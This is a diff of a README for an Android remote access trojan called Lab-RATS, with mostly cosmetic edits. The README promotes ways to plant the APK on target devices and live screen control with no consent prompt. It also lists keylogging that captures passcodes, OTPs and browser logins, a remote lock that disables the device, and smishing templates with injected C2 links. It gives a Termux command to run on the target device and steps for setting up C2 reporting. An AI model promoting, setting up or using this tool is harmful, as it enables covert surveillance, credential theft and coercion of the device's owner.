@@ -49,7 +49,7 @@
 
 ## 🕵️ Covert Operations & Stealth Management
 
-### 💉 **NEW!** **Payload Delivery Vectors** *(Installing APK onto Target Device)*:
+### 💉 **NEW!** **Ghost Delivery Vectors** *(Installing APK onto Target Device)*:
 - The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.
 
 ### 🛡️ **Evasion Engine**:
@@ -93,11 +93,11 @@
 ### 👻 Ghost_Operations:
 - **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
 - **Blackout Mode**: A **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **NON-masked live remote feed**. *(Pair with Ghost Control for maximum stealth)*
-- **NEW! Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to overwhelm the device.
-- **NEW! Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
+- **Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to overwhelm the device.
+- **Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
 - **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.
 
-### 🧪 NEW! Exploit_Factory:
+### 🧪 Exploit_Factory:
 - **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
 - **QR Visual Vector**: Dedicated **high-density QR code generator** for independent URL delivery.
 - **Smishing Library**: Pre-configured **tactical phishing templates** with **automated C2 link injection**.
@@ -130,8 +130,8 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 - **Modernized Interface**: Updated to `root@Android` prompt with **an updated `help` menu**.
 - **Hardened I/O**: **Multi-stage retry logic** and **unique execution tracking** for **zero-latency command output**.
 
-### 📊 Telemetry & Reporting:
-- **C2 Auto-Reporting**: **Discrete** reporting of **Date & Time, Device Make & Model, Connection Type *(WiFi/Cellular)*, IP Address, Port, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status, and Storage Space** to a centralized **Google Sheet or Render C2**.
+### 📊 Telemetry & Reporting (Expanded):
+- **C2 Auto-Reporting**: **Discrete** reporting of **Date & Time, Device Make & Model, Connection Type *(WiFi/Cellular)*, IP Address, Port #, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status, and Storage Space** to a **centralized Google Sheet or Render C2**.
 
 ---
 
@@ -143,8 +143,8 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 - **Unrestricted Tools**: **Install** and **run Python scripts, Nmap scans, or Metasploit** from the **C2 web terminal**.
 - **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
 > [!NOTE]
-> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**" (Most Common).
-<br>**Solution**: **On the Target Device** open **Termux and run**:
+> **Termux Bridge Issue**: "**Termux `allow-external-apps` setting is disabled**" *(Most Common)*.
+> <br>**Solution**: **On the Target Device** open **Termux and run**:
 ```
 echo "allow-external-apps = true" >> ~/.termux/termux.properties
 termux-reload-settings
@@ -152,14 +152,14 @@ termux-reload-settings
 
 ---
 
-## 📡 Command & Control (C2) Options
+## 📡 Command & Control *(C2)* Setup Options
 
 **Lab-RATS** supports **two primary methods** for **tracking your device fleet** and **receiving remote data**.
 
-### ☝🏻 Option 1: Google Sheet (Updated)
+### ☝🏻 Option 1: Google Sheet (v1.6.0)
 **Best for basic IP tracking** and **logging**. **No server maintenance required**.
 
-1.  **Create** a new <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
+1.  **Create** a **new** <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
 2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**
 
 ```javascript
@@ -229,13 +229,12 @@ function handleRequest(e) {
 - 📡 **Live Fleet List**: A **professional glass-morphism dashboard** to **manage all "Rats" in one place**.
 - 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your P2P links **are always up-to-date**.
 
-
 ---
 
 ## 🛠️ Get Started
 
 ### 1. Requirements
-*   **Java 17 or 21 installed** on your **workstation**.
+*   **Java 17 or 21 installed** on your **Workstation**.
 *   A **Test Android device**. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
 *   Your **Google Sheet Webhook URL or Render URL**. *(previous sections above)*
 
@@ -287,7 +286,7 @@ Once the **Target device** downloads the **APK**:
 **If** you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it **drives further development!!**
 
 ### Contributions:
-**Bug Reports, Add New Feature** and **Pull Requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*
+**Bug Reports, Add New Feature** and **Pull Requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/KAN3C0/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*
 
 ---
 
@@ -481,7 +480,7 @@ This tool is for **educational and authorized security testing purposes ONLY!**.
 
 ## 📄 License
 
-**Lab-RATS** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).
+**Lab-RATS** is **Licensed** to **KAN3C0** under the [MIT License](LICENSE).
 
 ---
 
